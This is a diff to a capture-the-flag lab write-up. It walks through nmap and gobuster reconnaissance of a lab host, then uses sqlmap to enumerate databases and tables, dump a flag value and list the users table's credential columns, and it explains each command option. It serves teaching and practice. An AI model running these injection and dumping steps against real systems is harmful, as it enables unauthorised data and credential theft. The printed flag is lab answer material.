@@ -25,6 +25,7 @@ PORT   STATE SERVICE REASON         VERSION
 ...
 ```
 Command Explaination:
+
 `-O` for OS dectecting system, do not misstype it with `-o` which is used for output.
 
 `-A` is aggressive mode for OS detection including OS version.
@@ -47,6 +48,7 @@ gobuster dir -u "http://10.201.112.33/" -w /usr/share/wordlists/dirbuster/direct
 ...
 ```
 Command Explaination:
+
 `dir` specifies using to enumerate directory.
 
 `-u` indicates the target.
@@ -103,6 +105,7 @@ sqlmap -r request.txt
 
 ```
 Command Explaination:
+
 `-r` for speciying request
 
 Therefore, I need to list the database
@@ -117,3 +120,97 @@ sqlmap -r request.txt --dbs
 [*] sys
 
 ```
+Command Explaination:
+
+`--dbs` for listing database
+
+Next, I want to extract table names of olympus database  for further enumerating 
+```
+sqlmap -r request.txt -D olympus --tables
+...
+Database: olympus
+[6 tables]
++------------+
+| categories |
+| chats      |
+| chmments   |
+| flag       |
+| fosts      |
+| users      |
++------------+
+
+...
+```
+Command Explaination:
+
+`-D` specifies the database that I used
+
+`--tables` for listing the table names of that database
+
+Maybe I can get the flag only accessing the flag table 
+```
+sqlmap -r request.txt -D olympus -T flag --columns
+...
+Database: olympus
+Table: flag
+[1 column]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| flag   | varchar(255) |
+
+...
+
+```
+Command Explaination:
+
+`-T` for specifying the table
+
+`--columns` for listing each columns inside that table
+
+Now, I know that this table only has one column called `flag` then I further access to the row to get the value of the `flag`
+```
+sqlmap -r request.txt -D olympus -T flag -C flag --dump
+...
+Database: olympus
+Table: flag
+[1 entry]
++---------------------------+
+| flag                      |
++---------------------------+
+| flag{Sm4rt!_k33P_d1gGIng} |
++---------------------------+
+...
+```
+Command Explaination:
+
+`-C` specifies the column name
+
+`--dump` for listing table data
+
+This is the first flag, I need to get the credentials of olympus service which means that I have to list the data of the user inside `users` table
+```
+sqlmap -r request.txt -D olympus -T users --columns
+...
+
+Database: olympus
+Table: users
+[9 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| randsalt       | varchar(255) |
+| user_email     | varchar(255) |
+| user_firstname | varchar(255) |
+| user_id        | int          |
+| user_image     | text         |
+| user_lastname  | varchar(255) |
+| user_name      | varchar(255) |
+| user_password  | varchar(255) |
+| user_role      | varchar(255) |
++----------------+--------------+
+
+...
+```
+# Reference
+[SQLmap](https://www.vaadata.com/blog/sqlmap-the-tool-for-detecting-and-exploiting-sql-injections/#listing-the-table-names)
